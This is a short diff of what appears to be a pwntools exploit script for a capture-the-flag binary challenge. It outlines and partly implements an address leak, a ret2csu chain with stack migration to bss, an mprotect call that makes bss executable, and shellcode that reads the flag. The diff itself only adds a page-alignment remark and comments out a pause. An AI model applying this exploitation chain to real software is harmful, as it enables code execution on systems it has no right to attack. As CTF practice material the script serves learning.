@@ -11,7 +11,7 @@
 exp: attack mprotect and ret2shellcode
 1.leak sub_1249 addr to calculate bin_base
 2.magic_gadget 0x1232 to complete ret2csu chain and stack migrating to bss
-3.attack mprotect to make the bss executable
+3.attack mprotect (must align with page size) to make the bss executable
 4.read in shellcode to the bss 
 5.ret2shellcode to ORW flag
 '''
@@ -95,7 +95,7 @@ payload = cyclic(0x38) + ret2csu(0, elf.bss(0x300), 0x100, read_got_addr)
 # ret2csu_gadget_front -> ret2csu_gadget_back within add rsp, 8
 payload += p64(0xfa1c4233) + p64(elf.bss(0x300 - 8)) * 6 + p64(leave_ret_addr) # stack migration
 sl(payload)
-pause()
+# pause()
 
 # hijack read to mprotect
 mprotect_from_read = libc.sym['mprotect'] - libc.sym['read']
